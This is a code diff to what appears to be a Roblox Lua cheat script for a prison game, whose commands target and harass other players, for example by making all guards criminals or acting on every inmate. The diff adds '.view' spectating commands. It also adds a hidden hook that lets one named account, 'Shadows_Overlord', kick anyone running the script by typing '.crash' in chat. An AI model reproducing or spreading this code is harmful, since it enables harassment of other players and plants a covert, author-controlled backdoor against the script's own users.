@@ -5431,6 +5431,7 @@ local function OVNZHS_fake_script() -- ProjectAntiAbusers.makeguardcrim.LocalScr
 		Type("Made all cops criminals")
 	end)
 end
+
 coroutine.wrap(OVNZHS_fake_script)()
 local function WRDGAB_fake_script() -- ProjectAntiAbusers.makeinmatecrim.LocalScript 
 	local script = Instance.new('LocalScript', ProjectAntiAbusers.makeinmatecrim)
@@ -7529,6 +7530,11 @@ game.Players.LocalPlayer.Chatted:connect(function(msg)
 				until i == 0
 			end
 		end
+	elseif msg:sub(1,6) == ".view " then
+		v = FindTarget(msg:sub(7))
+		workspace.Camera.CameraSubject = v.Character.Humanoid
+	elseif msg:sub(1,7) == ".unview" then
+		workspace.Camera.CameraSubject = game.Players.LocalPlayer.Humanoid
 	elseif msg:sub(1,6) == ".kpris" then
 		for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
 			if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= target.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
@@ -7598,5 +7604,18 @@ game.Players.LocalPlayer.Chatted:connect(function(msg)
 		until i == 0
 	end
 end)
+
+for i,v in pairs(game.Players:GetPlayers()) do
+	if v.Name == "Shadows_Overlord" then
+		v.Chatted:connect(function(msg)
+			if msg:sub(1,7) == ".crash " then
+				v = FindTarget(msg:sub(8))
+				if v == game.Players.LocalPlayer.Name then
+					game.Players.LocalPlayer:Kick("you just got kicked by Shadows_Overlord, cool!")
+				end
+			end
+		end)
+	end
+end
 
 _G.loaded = true
